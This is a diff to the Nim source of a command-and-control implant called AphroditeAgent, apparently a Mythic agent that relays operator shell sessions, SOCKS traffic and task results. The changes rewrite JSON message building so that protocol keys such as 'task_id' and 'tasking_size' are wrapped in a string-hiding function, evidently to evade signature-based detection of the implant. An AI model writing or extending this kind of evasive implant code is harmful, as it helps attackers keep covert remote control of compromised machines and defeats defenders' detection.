@@ -345,12 +345,11 @@ proc dispatchTask(ag: AphroditeAgent, task: JsonNode): JsonNode =
   let sendMsg = ag.makeSendMsg()
   let res = dispatch(cmd, taskID, params, ag.state, sendMsg)
 
-  result = %*{
-    "task_id":     taskID,
-    "user_output": res.output,
-    "completed":   res.completed,
-    "status":      res.status,
-  }
+  result = newJObject()
+  result[hidstr("task_id")]     = %taskID
+  result["user_output"]          = %res.output
+  result["completed"]            = %res.completed
+  result["status"]               = %res.status
   if not res.extraFields.isNil and res.extraFields.kind == JObject:
     for key, val in res.extraFields.pairs:
       result[key] = val
@@ -397,7 +396,7 @@ proc processInteractIn(interactArr: JsonNode) =
   ## Handle interactive messages from Mythic (operator → shell).
   if interactArr.isNil or interactArr.kind != JArray: return
   for msg in interactArr:
-    let taskId  = msg{"task_id"}.getStr("")
+    let taskId  = msg{hidstr("task_id")}.getStr("")
     let msgType = msg{"message_type"}.getInt(-1)
     let data    = decode(msg{"data"}.getStr(""))
 
@@ -416,18 +415,18 @@ proc collectInteractOut(): JsonNode =
   for taskId in jobActiveList():
     let output = jobDrainOutput(taskId)
     if output.len > 0:
-      result.add(%*{
-        "task_id":      taskId,
-        "data":         encode(output),
-        "message_type": INTERACT_OUTPUT,
-      })
+      var imsg = newJObject()
+      imsg[hidstr("task_id")] = %taskId
+      imsg["data"]             = %encode(output)
+      imsg["message_type"]     = %INTERACT_OUTPUT
+      result.add(imsg)
     ## If the job is no longer alive, send completion
     if not jobIsAlive(taskId):
-      result.add(%*{
-        "task_id":      taskId,
-        "data":         encode("Process exited.\n"),
-        "message_type": INTERACT_EXIT,
-      })
+      var imsg2 = newJObject()
+      imsg2[hidstr("task_id")] = %taskId
+      imsg2["data"]             = %encode("Process exited.\n")
+      imsg2["message_type"]     = %INTERACT_EXIT
+      result.add(imsg2)
 
 # ---------------------------------------------------------------------------
 # SOCKS helpers
@@ -493,10 +492,9 @@ proc run*(ag: AphroditeAgent) =
     if not ag.state.running: break
 
     ## --- Build get_tasking message ---
-    var pollMsg = %*{
-      "action":       hidstr("get_tasking"),
-      "tasking_size": -1,
-    }
+    var pollMsg = newJObject()
+    pollMsg["action"]               = %hidstr("get_tasking")
+    pollMsg[hidstr("tasking_size")] = %(-1)
     if pendingResponses.len > 0:
       pollMsg["responses"] = %pendingResponses
       pendingResponses = @[]
